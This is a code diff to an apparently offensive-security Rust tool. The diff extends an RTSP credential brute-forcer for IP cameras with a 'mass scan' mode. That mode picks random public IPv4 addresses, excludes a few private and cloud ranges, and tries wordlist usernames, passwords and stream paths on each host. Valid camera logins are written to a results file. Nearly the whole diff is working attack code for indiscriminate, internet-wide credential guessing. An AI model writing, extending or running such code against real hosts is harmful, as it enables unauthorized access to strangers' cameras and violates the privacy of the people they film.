@@ -1,4 +1,4 @@
-use anyhow::{anyhow, Result};
+use anyhow::{anyhow, Result, Context};
 use base64::engine::general_purpose::STANDARD as Base64;
 use base64::Engine as _;
 use colored::*;
@@ -6,31 +6,52 @@ use futures::stream::{FuturesUnordered, StreamExt};
 use std::{
     fs::File,
     io::Write,
-    net::SocketAddr,
+    net::{IpAddr, Ipv4Addr, SocketAddr},
     sync::Arc,
-    sync::atomic::{AtomicBool, Ordering},
+    sync::atomic::{AtomicBool, AtomicUsize, Ordering},
     time::Duration,
 };
 use tokio::{
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
     sync::{Mutex, Semaphore},
-    time::sleep,
+    time::{sleep, timeout},
+    process::Command,
+    fs::OpenOptions,
 };
+use rand::Rng;
 
 use crate::utils::{
-    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range,
+    prompt_yes_no, prompt_wordlist, prompt_default, prompt_int_range, prompt_port,
     load_lines, get_filename_in_current_dir, normalize_target,
 };
 use crate::modules::creds::utils::BruteforceStats;
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
+const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
+const STATE_FILE: &str = "rtsp_hose_state.log";
+
+// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc) - Copied from telnet_hose
+const EXCLUDED_RANGES: &[&str] = &[
+    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", // Private
+    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", // Multicast/Reserved
+    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", // Carrier/LinkLocal/Broadcast
+    // Cloudflare
+    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
+    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
+    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
+    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
+    "1.1.1.1/32", "1.0.0.1/32",
+    // Google
+    "8.8.8.8/32", "8.8.4.4/32"
+];
 
 fn display_banner() {
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
     println!("{}", "║   Advanced RTSP Brute Force Module                        ║".cyan());
     println!("{}", "║   IP Camera and Streaming Server Credential Testing       ║".cyan());
     println!("{}", "║   Supports path enumeration and custom headers            ║".cyan());
+    println!("{}", "║   Modes: Single Target & Mass Scan (Hose)                 ║".cyan());
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
     println!();
 }
@@ -38,10 +59,23 @@ fn display_banner() {
 /// Main entry point for the advanced RTSP brute force module.
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
-    println!("{}", format!("[*] Target: {}", target).cyan());
+    
+    // Check for Mass Scan Mode conditions
+    // If target is "random", "0.0.0.0", "0.0.0.0/0", or looks like a file path (and we can assume it's a file list)
+    // Note: The caller usually handles file loading for specific modules, but for "hose" modules like telnet_hose, passing the file path is common.
+    // We'll treat it as mass scan if it's explicitly "random" OR "0.0.0.0" OR if it points to an existing file.
+    // Simple heuristic: if we can open it as a file, treat as file list for mass scan.
+    let is_mass_scan = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0" || std::path::Path::new(target).is_file();
 
-    let port: u16 = prompt_default("RTSP Port", "554").await?
-        .parse().unwrap_or(554);
+    println!("{}", format!("[*] Target: {}", target).cyan());
+    if is_mass_scan {
+        println!("{}", "[*] Mode: Mass Scan / Hose".yellow());
+        return run_mass_scan(target).await;
+    }
+
+    // --- Standard Single-Target Logic ---
+
+    let port: u16 = prompt_port("RTSP Port", 554).await?;
 
     let usernames_file = prompt_wordlist("Username wordlist").await?;
     let passwords_file = prompt_wordlist("Password wordlist").await?;
@@ -72,7 +106,26 @@ pub async fn run(target: &str) -> Result<()> {
     };
     let advanced_headers = Arc::new(advanced_headers);
 
-    let (addr, implicit_path) = normalize_target_input(target, port)?;
+    // Extract RTSP path if present (e.g., rtsp://host:port/path -> path)
+    let implicit_path = extract_rtsp_path(target);
+    
+    // Normalize target and add port if needed
+    let target_normalized = if target.starts_with("rtsp://") {
+        target.strip_prefix("rtsp://")
+            .unwrap()
+            .split('/')
+            .next()
+            .unwrap_or(target)
+    } else {
+        target.split('/').next().unwrap_or(target)
+    };
+    
+    let normalized = normalize_target(target_normalized)?;
+    let addr = if normalized.contains(':') {
+        normalized
+    } else {
+        format!("{}:{}", normalized, port)
+    };
     let found = Arc::new(Mutex::new(Vec::new()));
     let stop = Arc::new(AtomicBool::new(false));
     let stats = Arc::new(BruteforceStats::new()); // Standardized stats
@@ -133,10 +186,6 @@ pub async fn run(target: &str) -> Result<()> {
 
     let mut tasks = FuturesUnordered::new();
     let mut idx = 0usize;
-
-    // Use loop structure from other modules or this module's custom loop?
-    // This module iterates: pass list (outer), user list (inner depending on combo), then paths.
-    // I will preserve the original logic flow.
 
     for pass in pass_lines {
         if stop_on_success && stop.load(Ordering::Relaxed) { break; }
@@ -212,9 +261,6 @@ pub async fn run(target: &str) -> Result<()> {
                     drop(permit);
                     sleep(Duration::from_millis(10)).await;
                 }));
-
-                // Limit task generation if queue prevents high memory usage (though semaphore limits active tasks)
-                // The semaphore logic above (acquire_owned) already throttles concurrency.
             }
         }
         idx += 1;
@@ -256,6 +302,282 @@ pub async fn run(target: &str) -> Result<()> {
     }
 
     Ok(())
+}
+
+/// Run mass scan logic (Hose style)
+async fn run_mass_scan(target: &str) -> Result<()> {
+    // Prep wordlists
+    println!("{}", "[*] Preparing Mass Scan configuration...".blue());
+    
+    let port: u16 = prompt_port("RTSP Port", 554).await?;
+    
+    let usernames_file = prompt_wordlist("Username wordlist").await?;
+    let passwords_file = prompt_wordlist("Password wordlist").await?;
+    let paths_file = prompt_wordlist("RTSP paths file (empty for none/root)").await?;
+    
+    let users = load_lines(&usernames_file)?;
+    let pass_lines = load_lines(&passwords_file)?;
+    let mut paths = load_lines(&paths_file)?;
+    if paths.is_empty() {
+         paths.push("".to_string());
+    }
+
+    if users.is_empty() || pass_lines.is_empty() {
+        return Err(anyhow!("Wordlists cannot be empty"));
+    }
+
+    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000).await? as usize;
+    let verbose = prompt_yes_no("Verbose mode?", false).await?;
+
+    let output_file = prompt_default("Output result file", "rtsp_mass_results.txt").await?;
+
+    // Parse exclusions
+    let mut exclusion_subnets = Vec::new();
+    for cidr in EXCLUDED_RANGES {
+        if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
+            exclusion_subnets.push(net);
+        }
+    }
+    let exclusions = Arc::new(exclusion_subnets);
+
+    // Shared State
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+    
+    let creds_pkg = Arc::new((users, pass_lines, paths));
+
+    // Stats Reporter
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(Duration::from_secs(5)).await;
+            println!(
+                "[*] Status: {} IPs scanned, {} RTSP streams found",
+                s_checked.load(Ordering::Relaxed),
+                s_found.load(Ordering::Relaxed).to_string().green().bold()
+            );
+        }
+    });
+
+    let run_random = target == "random" || target == "0.0.0.0" || target == "0.0.0.0/0";
+
+    if run_random {
+        println!("{}", "[*] Starting Random Internet Scan...".green());
+        loop {
+             let permit = semaphore.clone().acquire_owned().await.unwrap();
+             let exc = exclusions.clone();
+             let cp = creds_pkg.clone();
+             let sc = stats_checked.clone();
+             let sf = stats_found.clone();
+             let of = output_file.clone();
+             
+             tokio::spawn(async move {
+                 let ip = generate_random_public_ip(&exc);
+                 
+                 // Deduplication check
+                 if !is_ip_checked(&ip).await {
+                     mark_ip_checked(&ip).await;
+                     mass_scan_host(ip, port, cp, sf, of, verbose).await;
+                 }
+                 
+                 sc.fetch_add(1, Ordering::Relaxed);
+                 drop(permit);
+             });
+        }
+    } else {
+        // File Mode
+        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
+        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
+        println!("{}", format!("[*] Loaded {} targets from file.", lines.len()).blue());
+
+        for ip_str in lines {
+             let permit = semaphore.clone().acquire_owned().await.unwrap();
+             let cp = creds_pkg.clone();
+             let sc = stats_checked.clone();
+             let sf = stats_found.clone();
+             let of = output_file.clone();
+             
+             // Try parse IP, or resolve? For mass scan usually IP lists. We'll try resolve if parsing fails.
+             // But to keep it simple and aligned with "hose" logic which normally takes IPs:
+             let ip_addr = match ip_str.parse::<IpAddr>() {
+                 Ok(ip) => Some(ip),
+                 Err(_) => {
+                     // Try resolve
+                     match tokio::net::lookup_host(format!("{}:{}", ip_str, port)).await {
+                         Ok(mut iter) => iter.next().map(|s| s.ip()),
+                         Err(_) => None
+                     }
+                 }
+             };
+
+             tokio::spawn(async move {
+                 if let Some(ip) = ip_addr {
+                    if !is_ip_checked(&ip).await {
+                        mark_ip_checked(&ip).await;
+                        mass_scan_host(ip, port, cp, sf, of, verbose).await;
+                    }
+                 }
+                 sc.fetch_add(1, Ordering::Relaxed);
+                 drop(permit);
+             });
+        }
+        
+        // Wait for finish
+        for _ in 0..concurrency {
+            let _ = semaphore.acquire().await.context("Semaphore acquisition failed")?;
+        }
+    }
+
+    Ok(())
+}
+
+async fn mass_scan_host(
+    ip: IpAddr, 
+    port: u16, 
+    creds: Arc<(Vec<String>, Vec<String>, Vec<String>)>, 
+    stats_found: Arc<AtomicUsize>,
+    output_file: String,
+    verbose: bool
+) {
+    let sa = SocketAddr::new(ip, port);
+    
+    // 1. Connection Check (Fast Fail)
+    if timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(&sa)).await.is_err() {
+        return;
+    }
+    
+    // 2. Bruteforce
+    let (users, passes, paths) = &*creds;
+    
+    // Helper to cleanup repetitive calls
+    // We iterate: Path -> User -> Pass ? Or User -> Pass -> Path?
+    // RTSP paths are important. Often root works.
+    
+    for path in paths {
+        for user in users {
+            for pass in passes {
+                // We use the existing try_rtsp_login. 
+                // It does re-connect, which is not optimal but robust.
+                let addrs = [sa];
+                let empty_headers: Vec<String> = Vec::new();
+                
+                // For mass scan, we assume standard DESCRIBE or OPTIONS is fine.
+                // try_rtsp_login defaults to OPTIONS if None, let's use DESCRIBE if we want to check stream?
+                // Actually existing tool defaults to OPTIONS unless advanced is on. OPTIONS is auth-less often?
+                // No, OPTIONS usually requires auth if server is secure.
+                
+                let res = try_rtsp_login(
+                    &addrs, 
+                    &sa.to_string(), 
+                    user, 
+                    pass, 
+                    path, 
+                    Some("DESCRIBE"), // Use DESCRIBE to be sure we can access stream info
+                    &empty_headers
+                ).await;
+
+                match res {
+                   Ok(true) => {
+                       // Success!
+                       let result_str = format!("{} -> {}:{} [path={}]", sa, user, pass, path);
+                       println!("\r{}", format!("[+] FOUND: {}", result_str).green().bold());
+                       
+                       // Save
+                       if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(&output_file).await {
+                           let _ = file.write_all(format!("{}\n", result_str).as_bytes()).await;
+                       }
+                       
+                       stats_found.fetch_add(1, Ordering::Relaxed);
+                       return; // Stop scanning this host on found
+                   }
+                   Ok(false) => {
+                       // Auth failure
+                   }
+                   Err(e) => {
+                       // Connection error or protocol error
+                       if verbose {
+                            // Only print verbose errors if really needed, prevents spam
+                       }
+                       // If connection failed (rst/timeout), often no point trying other creds?
+                       // But existing function returns Err on IO error.
+                       // We should probably stop trying this host if we get Refused/Timeout inside loop?
+                       let err_str = e.to_string().to_lowercase();
+                       if err_str.contains("refused") || err_str.contains("timeout") || err_str.contains("reset") {
+                           return; // Host dead or blocking us
+                       }
+                   }
+                }
+                // Small sleep to be polite?
+                // sleep(Duration::from_millis(50)).await; 
+            }
+        }
+    }
+}
+
+
+fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
+    let mut rng = rand::rng();
+    loop {
+        let octets: [u8; 4] = rng.random();
+        let ip = Ipv4Addr::from(octets);
+        let ip_addr = IpAddr::V4(ip);
+        
+        let mut excluded = false;
+        for net in exclusions {
+            if net.contains(ip_addr) {
+                excluded = true;
+                break;
+            }
+        }
+        
+        if !excluded {
+            return ip_addr;
+        }
+    }
+}
+
+async fn is_ip_checked(ip: &impl ToString) -> bool {
+    // Ensure state file exists before running grep
+    if !std::path::Path::new(STATE_FILE).exists() {
+        // Create empty state file to avoid grep errors
+        if let Ok(mut file) = OpenOptions::new()
+            .create(true)
+            .write(true)
+            .open(STATE_FILE)
+            .await
+        {
+            let _ = file.flush().await;
+        }
+        return false; // File was just created, IP definitely not checked
+    }
+
+    let ip_s = ip.to_string();
+    let status = Command::new("grep")
+        .arg("-F")
+        .arg("-q")
+        .arg(format!("checked: {}", ip_s))
+        .arg(STATE_FILE)
+        .status()
+        .await;
+    
+    match status {
+        Ok(s) => s.success(), 
+        Err(_) => false, 
+    }
+}
+
+async fn mark_ip_checked(ip: &impl ToString) {
+    let data = format!("checked: {}\n", ip.to_string());
+    if let Ok(mut file) = OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(STATE_FILE)
+        .await 
+    {
+        let _ = file.write_all(data.as_bytes()).await;
+    }
 }
 
 /// Resolve a host:port (literal v4/v6 or DNS) into all possible SocketAddrs.
@@ -309,15 +631,19 @@ async fn try_rtsp_login(
 
     // Try each candidate address
     for sa in addrs {
-        match TcpStream::connect(*sa).await {
-            Ok(s) => {
+        match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), TcpStream::connect(*sa)).await {
+            Ok(Ok(s)) => {
                 stream = Some(s);
                 connected_sa = Some(*sa);
                 break;
             }
-            Err(e) => {
+            Ok(Err(e)) => {
                 last_err = Some(e);
                 continue;
+            }
+            Err(_) => {
+                 last_err = Some(std::io::Error::new(std::io::ErrorKind::TimedOut, "Connect timeout"));
+                 continue;
             }
         }
     }
@@ -364,7 +690,13 @@ async fn try_rtsp_login(
 
     stream.write_all(request.as_bytes()).await?;
     let mut buffer = [0u8; 2048];
-    let n = stream.read(&mut buffer).await?;
+    // Add Read timeout
+    let n = match timeout(Duration::from_millis(MASS_SCAN_CONNECT_TIMEOUT_MS), stream.read(&mut buffer)).await {
+        Ok(Ok(n)) => n,
+        Ok(Err(e)) => return Err(e.into()),
+        Err(_) => return Err(anyhow!("Read timeout")),
+    };
+    
     if n == 0 {
         return Err(anyhow!("{}: server closed connection unexpectedly.", addr_display));
     }
@@ -375,63 +707,42 @@ async fn try_rtsp_login(
     } else if response.contains("401") || response.contains("403") {
         Ok(false)
     } else {
-        Err(anyhow!("{}: unexpected RTSP response:\n{}", addr_display, response))
+        // Some cameras might return 404 if path is wrong but still authorized? 
+        // Or 400 Bad Request?
+        // Safest is to treat anything not 200 as fail, but maybe check for specifc auth fail codes.
+        // If we get 404, the creds might be valid but path invalid. 
+        // But without positive valid signal, we assume fail.
+        Err(anyhow!("{}: unexpected RTSP response: {}", addr_display, response.lines().next().unwrap_or("")))
     }
 }
 
-fn normalize_target_input(target: &str, default_port: u16) -> Result<(String, Option<String>)> {
+/// Extract RTSP path from target string (e.g., rtsp://host:port/path -> Some("/path"))
+/// Returns None if no path is present or if path is just "/"
+fn extract_rtsp_path(target: &str) -> Option<String> {
     let trimmed = target.trim();
-    if trimmed.is_empty() {
-        return Err(anyhow!("Target cannot be empty."));
-    }
-
-    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
-    let (host_part, path_part) = if let Some((host, path)) = without_scheme.split_once('/') {
-        (host.trim(), Some(path.to_string()))
-    } else {
-        (without_scheme.trim(), None)
-    };
-
-    // Use shared normalization for the host/port part
-    let normalized_host = normalize_target(host_part)?;
     
-    // Check if normalized host implies a port. normalize_target returns host:port or host.
-    // If it has no port, we might want to append default_port, OR return it as is and let caller handle.
-    // However, existing logic seemed to force a port.
-    // Let's check if port is present.
-    // A simple heuristic: if it ends with digit, check for colon.
-    // [ipv6]:port, ipv4:port, host:port.
-    // If we assume normalize_target did its job, we just need to adhere to the return type.
-    // But wait, if normalize_target returned "host", and we want "host:554", we need to append.
-    // Checking for port on a normalized string:
-    let has_port = if normalized_host.starts_with('[') {
-        normalized_host.rfind(':').map(|i| i > normalized_host.rfind(']').unwrap_or(0)).unwrap_or(false)
-    } else {
-        normalized_host.contains(':')
-    };
-
-    let final_host = if has_port {
-        normalized_host
-    } else {
-        format!("{}:{}", normalized_host, default_port)
-    };
-
-    let normalized_path = path_part.and_then(|p| {
-        let truncated = p.split(|c| c == '?' || c == '#').next().unwrap_or_default();
-        let trimmed = truncated.trim();
-        if trimmed.is_empty() || trimmed == "/" {
+    // Remove rtsp:// scheme if present
+    let without_scheme = trimmed.strip_prefix("rtsp://").unwrap_or(trimmed);
+    
+    // Split on first '/' to separate host:port from path
+    if let Some((_, path)) = without_scheme.split_once('/') {
+        // Remove query strings and fragments
+        let clean_path = path.split(|c| c == '?' || c == '#')
+            .next()
+            .unwrap_or_default()
+            .trim();
+        
+        if clean_path.is_empty() || clean_path == "/" {
             None
         } else {
-            let mut path = trimmed.to_string();
-            if !path.starts_with('/') {
-                path.insert(0, '/');
+            // Ensure path starts with '/'
+            let mut final_path = clean_path.to_string();
+            if !final_path.starts_with('/') {
+                final_path.insert(0, '/');
             }
-            Some(path)
+            Some(final_path)
         }
-    });
-
-    Ok((final_host, normalized_path))
+    } else {
+        None
+    }
 }
-// ─── Prompt and utility functions unchanged ───────────────────────────────────
-
-
